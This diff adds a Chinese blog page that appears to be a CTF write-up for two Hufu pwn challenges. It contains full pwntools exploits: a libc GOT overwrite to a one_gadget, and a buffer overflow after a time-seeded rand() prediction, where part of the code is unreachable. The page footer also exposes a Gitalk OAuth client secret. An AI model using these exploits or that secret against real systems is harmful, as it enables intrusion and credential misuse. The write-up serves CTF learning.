@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    虎符部分pwn |
+    
+    summerN&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="summerN's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-虎符部分pwn" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      虎符部分pwn
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/04/21/%E8%99%8E%E7%AC%A6%E9%83%A8%E5%88%86pwn/" class="article-date">
+  <time datetime="2020-04-21T03:23:27.580Z" itemprop="datePublished">2020-04-21</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <h1 id="虎符部分pwn-wp"><a href="#虎符部分pwn-wp" class="headerlink" title="虎符部分pwn  wp"></a>虎符部分pwn  wp</h1><a id="more"></a>
+
+<p>我太菜了，四个pwn只有俩做出来</p>
+<h2 id="pwn1：MarksMan"><a href="#pwn1：MarksMan" class="headerlink" title="pwn1：MarksMan"></a>pwn1：MarksMan</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>考察点：任意写(3字节)</p>
+<p>很常规的一道内存任意写的题目，程序开头给了puts的地址，甚至都不需要泄漏libc。主要代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ptr = get_l();</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"biang!"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;src[i], <span class="number">1u</span>LL);</span><br><span class="line">  getchar();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( goldfinger(src) )&#123;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j )</span><br><span class="line">    *(j + ptr) = src[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !dlopen(<span class="number">0L</span>L, <span class="number">1</span>) )</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"bye~"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0L</span>L;</span><br></pre></td></tr></table></figure>
+
+<p>先读一个指针，然后依次读三个字节，这三个字节的数据将会覆盖到指针执向内存的后三个字节。</p>
+<p>我们获取了libc，想要挟持程序，我们发现此程序保护开启是无法挟持got表的，但是坑爹的时这个题目的libc的got表保护没有开启，所以我们考虑覆盖libc中的got表数据</p>
+<p>1.这里有个dlopen函数</p>
+<p>2.我们感觉可以点在这里，所以我们跟进dlopen函数</p>
+<p>这里有个知识点：</p>
+<p>本地调试的时候，发现程序根本跳转到dlopen，所以我们无法跟进。</p>
+<p>所以这里我们使用了一个新的调试方法</p>
+<p>方法：手动设置rip为下一条地址</p>
+<p>gdb命令  set $rip=xxxxxx</p>
+<p>这样就可以无条件跳转了</p>
+<p>gdb跟进dlopen，发现_dlerror_run+96这里有个plt函数的调用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► 0x7ffff7bd2730 &lt;_dlerror_run+96&gt;     call   _dl_catch_error@plt &lt;0x7ffff7bd1d90&gt;</span><br><span class="line">       rdi: 0x7ffff7dd40f0 (last_result+16) ◂— 0x0</span><br><span class="line">       rsi: 0x7ffff7dd40f8 (last_result+24) ◂— 0x0</span><br><span class="line">       rdx: 0x7ffff7dd40e8 (last_result+8) ◂— 0x0</span><br><span class="line">       rcx: 0x7ffff7bd1f40 (dlopen_doit) ◂— push   rbx</span><br></pre></td></tr></table></figure>
+
+<p>跟进查看_dl_catch_error的plt表:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► 0x7ffff7bd1d90 &lt;_dl_catch_error@plt&gt;             jmp    qword ptr [rip + 0x2022a2] &lt;0x7ffff7dd4038&gt;</span><br><span class="line">   0x7ffff7bd1d96 &lt;_dl_catch_error@plt+6&gt;           push   4</span><br><span class="line">   0x7ffff7bd1d9b &lt;_dl_catch_error@plt+11&gt;          jmp    0x7ffff7bd1d40</span><br></pre></td></tr></table></figure>
+
+<p>查看GOT表中的值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;xg 0x7ffff7dd4038</span><br><span class="line">0x7ffff7dd4038:	0x00007ffff7bd1d96</span><br></pre></td></tr></table></figure>
+
+<p>显然是个libc的函数，但是不知道是啥，不过那并不重要..只要是libc的就好，用任意写3字节直接覆盖后3字节，把他改成one_gadget就行了。</p>
+<p>同时，本题目的的one_gadget 貌似被限制了，但是one_gadget还有新的功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget默认显示限制比较少的gadget，用-l参数可以设置显示级别，显示更多的gadget</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如 one_gadget libc.so.6 -l2</span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.arch = 'amd64'</span></span><br><span class="line"><span class="comment">#context.arch = 'i386'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">file_name = <span class="string">'./chall'</span></span><br><span class="line"><span class="comment">#libc_name = ''</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'28068'</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span>(debug == <span class="number">1</span>):</span><br><span class="line">	p = process(file_name)</span><br><span class="line">	elf = ELF(file_name)</span><br><span class="line">	libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(ip,int(port))</span><br><span class="line">	elf = ELF(file_name)</span><br><span class="line">	libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'I placed the target near:'</span>)</span><br><span class="line">puts_add = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> int(puts_add)</span><br><span class="line"><span class="comment">#libc = LibcSearcher('puts',int(puts_add))</span></span><br><span class="line">libc_base = puts_add - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">system_add = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_add = libc_base + libc.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">libc_got = <span class="number">0x5f4038</span></span><br><span class="line">target = libc_base + libc_got</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'shoot!shoot!\n'</span>)</span><br><span class="line">payload = p64(target)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">one_gadget = libc_base + <span class="number">0xe569f</span></span><br><span class="line"><span class="keyword">print</span> hex(one_gadget)</span><br><span class="line">one_1  = one_gadget &amp; <span class="number">0xff</span></span><br><span class="line">one_2  = (one_gadget &amp; <span class="number">0xffff</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">one_3  = (one_gadget &amp; <span class="number">0xffffff</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line"><span class="keyword">print</span> p8(one_1)</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(one_1))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(one_2))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(one_3))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用挟持exit_hook ,具体怎么做还没有去看，先记录一下</p>
+<p>参考blog <a href="https://blog.csdn.net/qq_43116977/article/details/105485947" target="_blank" rel="noopener">https://blog.csdn.net/qq_43116977/article/details/105485947</a></p>
+<h2 id="pwn4-count"><a href="#pwn4-count" class="headerlink" title="pwn4 count"></a>pwn4 count</h2><p>一个很简单的随机数问题，并且把随机数都给你了，直接上exp</p>
+<p>爆破200次</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.update(arch='amd64',os='linux',timeout=1)</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">p=remote(<span class="string">'39.97.210.182'</span>,<span class="number">40285</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">	p.recvuntil(<span class="string">'levels ~Math: '</span>)</span><br><span class="line">	a=p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>]</span><br><span class="line">	p.recvuntil(<span class="string">'* '</span>)</span><br><span class="line">	b=p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>]</span><br><span class="line">	p.recvuntil(<span class="string">'+ '</span>)</span><br><span class="line">	c=p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>]</span><br><span class="line">	p.recvuntil(<span class="string">'+ '</span>)</span><br><span class="line">	d=p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>]</span><br><span class="line">	sums=int(a)*int(b)+int(c)+int(d)</span><br><span class="line">	print(sums)</span><br><span class="line">	p.sendlineafter(<span class="string">':'</span>,str(sums))</span><br><span class="line">f=<span class="number">304305682</span></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x64</span>+p64(f))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>刚开始以为要爆破，但是貌似本地的系统地址和服务器的不一样，一般爆破60次程序就崩溃了</p>
+<p>但是适用于其他题目：exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.arch = 'amd64'</span></span><br><span class="line"><span class="comment">#context.arch = 'i386'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">file_name = <span class="string">'./pwn'</span></span><br><span class="line"><span class="comment">#libc_name = ''</span></span><br><span class="line">ip = <span class="string">'39.97.210.182'</span></span><br><span class="line">port = <span class="string">'40285'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">if</span>(debug == <span class="number">1</span>):</span><br><span class="line">			p = process(file_name)</span><br><span class="line">			elf = ELF(file_name)</span><br><span class="line">			<span class="comment">#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			p = remote(ip,int(port))</span><br><span class="line">			elf = ELF(file_name)</span><br><span class="line">			<span class="comment">#libc = ELF("./libc.so.6")</span></span><br><span class="line">			b = <span class="number">1</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">			<span class="comment">#p.recvuntil('input answer:')</span></span><br><span class="line">			a = libc.time(<span class="number">0</span>)</span><br><span class="line">			<span class="comment">#print a</span></span><br><span class="line">			v0 = libc.srand(a)</span><br><span class="line">			v2 =  (libc.rand(v0) % <span class="number">100</span>)</span><br><span class="line">			<span class="comment">#print v2</span></span><br><span class="line">			v14 = v2</span><br><span class="line">			v3 = (libc.rand(v2) % <span class="number">100</span>)</span><br><span class="line">			<span class="comment">#print v3</span></span><br><span class="line">			v13 = v3</span><br><span class="line">			v4 = (libc.rand(v3) % <span class="number">100</span>)</span><br><span class="line">			<span class="comment">#print v4</span></span><br><span class="line">			v12 = v4</span><br><span class="line">			v11 = (libc.rand(v4) % <span class="number">100</span>)</span><br><span class="line">			v10 = v14 * v13 + v12 + v11</span><br><span class="line">			payload = str(v10)</span><br><span class="line">			p.recvuntil(<span class="string">'input answer:'</span>)</span><br><span class="line">			p.send(payload)</span><br><span class="line">			<span class="keyword">print</span> b</span><br><span class="line">			b = b+<span class="number">1</span></span><br><span class="line">			sleep(<span class="number">0.01</span>)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">		p.close()</span><br><span class="line">		offset = <span class="number">0x88</span> - <span class="number">0x24</span></span><br><span class="line">		v8 = <span class="number">0x12235612</span></span><br><span class="line">		payload2 = <span class="string">'\x00'</span> * offset + str(v8)</span><br><span class="line">		p.recvuntil(<span class="string">'good !'</span>)</span><br><span class="line">		p.send(payload2)</span><br><span class="line">		p.interactive()</span><br><span class="line">		sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://summern.club/2020/04/21/%E8%99%8E%E7%AC%A6%E9%83%A8%E5%88%86pwn/" data-id="ck99cgj0t000w0klu2ca4b5k4"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/03/29/CTF_Show%20%E9%83%A8%E5%88%86wp/" class="article-nav-link">
+        <strong class="article-nav-caption">Olde posts</strong>
+        <div class="article-nav-title">CTF_Show 部分wp</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '665e1db541e975225bc6',
+      clientSecret: '525f3534fe6005375cf8c02330ed09a2b7aab7d5',
+      repo: 'talk',
+      owner: 'summerN',
+      admin: ['summerN'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 summerN&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="summerN&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
